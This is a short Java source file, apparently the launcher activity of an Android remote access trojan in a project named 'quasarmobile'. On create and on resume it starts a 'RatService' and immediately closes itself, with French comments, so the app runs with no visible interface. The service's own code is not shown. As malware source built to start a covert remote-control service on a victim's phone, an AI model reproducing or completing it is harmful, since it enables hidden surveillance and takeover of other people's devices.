// MainActivity.java
package com.yourcompany.quasarmobile;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "MainActivity créée.");

        Intent serviceIntent = new Intent(this, RatService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
         } else {
             startService(serviceIntent);
         }
        finish(); // Fermer l'activité immédiatement
    }

    @Override
    protected void onResume() {
        super.onResume();
         Intent serviceIntent = new Intent(this, RatService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
         } else {
             startService(serviceIntent);
         }
        finish(); // Fermer l'activité immédiatement
    }
}
